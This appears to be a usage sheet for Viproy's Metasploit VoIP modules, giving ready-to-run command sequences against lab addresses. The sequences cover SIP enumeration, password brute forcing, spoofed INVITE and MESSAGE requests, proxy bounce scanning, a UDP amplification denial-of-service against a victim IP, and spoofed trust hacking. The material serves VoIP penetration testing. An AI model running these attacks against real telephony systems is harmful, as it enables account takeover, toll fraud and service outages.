#SIP Modules Usage

##Register 

use auxiliary/voip/viproy_sip_register 
set RHOSTS 192.168.1.222
set USERNAME 201
set FROM 201
set PASSWORD password123
set PROTO TCP
set LOGIN true
set DEBUG true
set VERBOSE true 
run

##Options 

use auxiliary/voip/viproy_sip_options 
set RHOSTS 192.168.1.221-222
set PROTO UDP
set DEBUG true
set VERBOSE true
run

##Negotiate 

use auxiliary/voip/viproy_sip_negotiate 
set RHOSTS 192.168.1.221-222
set PROTO UDP
set DEBUG true
set VERBOSE true
run


##Subscribe 

use auxiliary/voip/viproy_sip_subscribe
set RHOST 192.168.1.221
set PROTO UDP
set DEBUG true
set VERBOSE true
run

##Enumerate 

use auxiliary/voip/viproy_sip_enumerate 
set RHOST 192.168.1.221
set NUMERIC_USERS true
set NUMERIC_MIN 100
set NUMERIC_MAX 210
set VERBOSE false
run

##Brute Force 

use auxiliary/voip/viproy_sip_bruteforce 
set RHOST 192.168.1.221
set NUMERIC_USERS true
set NUMERIC_MIN 101
set NUMERIC_MAX 102
set PASSWORD letmein123
set VERBOSE true
set DEBUG true
run

##Invite

use auxiliary/voip/viproy_sip_invite 
show options 
set CPORT 5075
set RHOST 192.168.1.222
set FROM 203
set TO 201
set DEBUG true
set VERBOSE true
set LOGIN true
set PASSWORD test12345
set USERNAME 203
run

##Invite

use auxiliary/voip/viproy_sip_message
show options 
set RHOST 192.168.1.222
set FROM 203
set TO 201
set USERNAME 203
set LOGIN true
set MESSAGE_CONTENT test
set PASSWORD test12345
run

##Proxy Bounce Scan

use auxiliary/voip/viproy_sip_proxybouncescan 
show options 
set CPORT 5089
set RHOSTS 192.168.1.220-225
set RPORTS 5060-5070
set SIP_SERVER_IP 192.168.1.222
set SIP_SERVER_PORT 5060
run

##UDP Amplification DOS

use auxiliary/voip/viproy_sip_udpampdos 
set SIP_SERVERS 192.168.1.221
set VICTIM_IP 192.168.1.222
set VICTIM_PORT 5098
set INTERFACE en5
show options 
run

##UDP Trust Hacking

use auxiliary/voip/viproy_sip_trusthacking 
set SRC_RHOSTS 192.168.1.220-225
set SIP_SERVER 192.168.1.222
set THREADS 5
set INTERFACE eth0
run


